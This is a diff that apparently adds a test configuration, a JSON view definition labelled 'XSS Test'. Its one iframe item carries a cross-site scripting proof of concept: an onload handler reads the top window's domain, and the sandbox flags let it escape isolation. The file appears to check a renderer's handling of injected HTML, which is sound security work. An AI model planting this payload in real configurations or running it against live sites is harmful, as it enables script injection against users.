@@ -1,0 +1,24 @@
+{
+  "config": {
+    "view": {
+      "type": "view.list",
+      "items": [
+        {
+          "type": "view.group",
+          "label": "XSS Test",
+          "content": {
+            "type": "view.list",
+            "items": [
+              {
+                "type": "view.iframe",
+                "label": "XSS",
+                "html": "<iframe src=''onload='alert(window.top.document.domain)' style='width:100%;height:300px;' sandbox='allow-scripts allow-same-origin'></iframe>"
+              }
+            ]
+          }
+        }
+      ]
+    }
+  },
+  "input": {}
+}
